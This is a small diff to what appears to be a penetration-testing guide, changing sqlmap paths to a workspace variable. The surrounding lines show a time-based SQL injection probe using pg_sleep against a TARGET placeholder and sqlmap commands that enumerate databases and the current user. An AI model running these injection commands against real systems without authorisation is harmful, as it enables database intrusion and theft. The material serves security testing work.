@@ -26,8 +26,8 @@ time curl -s "https://TARGET/item?id=1'; SELECT pg_sleep(5)--"           # ~5s s
 ```
 Then let sqlmap do the heavy lifting (save a raw request from Burp/curl for fidelity):
 ```bash
-sqlmap -r evidence/req.txt --batch --level 3 --risk 2 --technique=BEUST --dbs \
-  --output-dir=evidence/sqlmap
+sqlmap -r "$PIRED_WORKSPACE/evidence/req.txt" --batch --level 3 --risk 2 --technique=BEUST --dbs \
+  --output-dir="$PIRED_WORKSPACE/evidence/sqlmap"
 # targeted param + safe enumeration only:
 sqlmap -u "https://TARGET/item?id=1" -p id --batch --current-user --current-db
 ```
